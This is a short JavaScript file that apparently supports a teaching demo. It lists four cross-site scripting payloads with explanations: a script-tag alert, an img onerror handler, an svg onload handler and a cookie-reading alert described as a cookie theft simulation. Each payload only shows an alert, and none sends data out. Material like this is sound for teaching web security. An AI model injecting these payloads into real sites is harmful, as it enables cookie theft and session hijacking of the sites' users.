/* ============================================
   payloads.js — XSS Payload Library
   ============================================ */

const payloads = [
  {
    name: '1. Basic Script Alert',
    code: "<script>alert('XSS!')<\/script>",
    description: 'Classic script tag injection. The browser HTML parser encounters a <script> tag and executes its contents as JavaScript.',
    msg: "XSS!",
    vector: 'Script tag injection'
  },
  {
    name: '2. Image onerror',
    code: '<img src=x onerror="alert(\'Stored XSS\')">',
    description: 'Loads a broken image (src=x). The onerror event fires, executing JavaScript. Bypasses filters that only block <script> tags.',
    msg: "Stored XSS",
    vector: 'Event handler injection'
  },
  {
    name: '3. SVG onload',
    code: '<svg onload="alert(document.domain)">',
    description: 'SVG elements support inline event handlers. The onload event fires on render, leaking document.domain to demonstrate info disclosure.',
    msg: window.location.hostname || "localhost",
    vector: 'SVG event handler'
  },
  {
    name: '4. Cookie Theft Sim',
    code: "<script>alert('Cookie: ' + document.cookie)<\/script>",
    description: 'Reads all cookies accessible to JavaScript. In a real attack, cookies would be exfiltrated to an attacker-controlled server.',
    msg: "Cookie: " + (document.cookie || "session=demo_abc123"),
    vector: 'Session hijacking'
  }
];
